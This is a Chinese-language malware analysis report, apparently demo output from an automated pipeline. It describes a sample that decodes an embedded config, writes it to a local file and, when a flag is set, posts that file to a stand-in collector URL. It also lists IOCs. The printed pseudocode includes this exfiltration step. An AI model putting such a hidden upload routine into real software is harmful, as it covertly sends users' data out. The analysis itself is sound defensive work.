# 恶意代码调查报告

## 一、核心已确认行为

**G:C001 | 读取并解码配置资源**
条件：入口被调用且配置解码成功；操作：read_demo_resource → decode_demo_config；结果：config 配置对象。
证据：F-0010 L1-L3。
关键源码（F-0010，来自 J00.md，原始证据 F-0010 L1-L3）：
```text
L0001: resource = read_demo_resource("HTML_PREVIEW_TEST");
L0002: config = decode_demo_config(resource);
L0003: if (!config) return false;
```

**G:C002 | 将配置写入本地文件**
条件：config 非空；操作：CreateFileA → WriteFile → CloseHandle；结果：C:\HTML_PREVIEW_TEST\demo.cfg。
证据：F-0010 L4-L7。
关键源码（F-0010，来自 J00.md，原始证据 F-0010 L4-L7）：
```text
L0004: path = "C:\HTML_PREVIEW_TEST\demo.cfg";
L0005: h = CreateFileA(path, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, 0, 0);
L0006: WriteFile(h, config, config_size, &written, 0);
L0007: CloseHandle(h);
```

**G:C003 | 按开关将配置文件提交至网络端点**
条件：config->send_enabled 为真；操作：read_demo_file → demo_http_post；结果：https://collector.invalid/preview。
证据：F-0010 L8-L11。
关键源码（F-0010，来自 J00.md，原始证据 F-0010 L8-L11）：
```text
L0008: if (config->send_enabled) {
L0009:   body = read_demo_file(path);
L0010:   endpoint = "https://collector.invalid/preview";
L0011:   demo_http_post(endpoint, body);
```

## 二、疑似行为

**G:C004 | 疑似可能按配置切换额外数据处理模式**
线索：配置 mode 字段 → 解析处理例程并间接调用 → 用途未明确的目标例程。
证据：F-0020 L1-L5。
关键源码（F-0020，来自 J00.md，原始证据 F-0020 L1-L5）：
```text
L0001: mode = config->mode;
L0002: if (mode == 2) {
L0003:   target = resolve_mode_handler(mode);
L0004:   target(config);
L0005: }
```
关键未闭合点：目标例程未恢复，额外模式的具体用途及其与主流程的联系尚未明确。。

## 三、IOC 与检测特征

### 高价值 IOC

- G:A001 `C:\HTML_PREVIEW_TEST\demo.cfg`（file，created_output，high）
- G:A002 `https://collector.invalid/preview`（network，other，high）
- G:A003 `HTML_PREVIEW_TEST`（resource，config_marker，high）

### 关联检测特征

无额外关联检测特征。

## 四、分析范围与交付情况

以下仅说明本次调查交付状态；历史待调查问题不等于当前尚未解决的行为。
未记录结构化交付异常。

## 附录 A：待调查与历史线索

本附录保留调查过程中形成的有效线索及历史问题。它们可能已由后续证据回答，不能直接解释为当前仍然未知。

- **R:G001 [historical_gap]** 模式2目标例程承担什么作用？

## 附录 B：其他材料与审计去向


完整 Claim、Artifact、证据与来源去向见 `_report_ready.json` 和 `_knowledge_audit.json`。
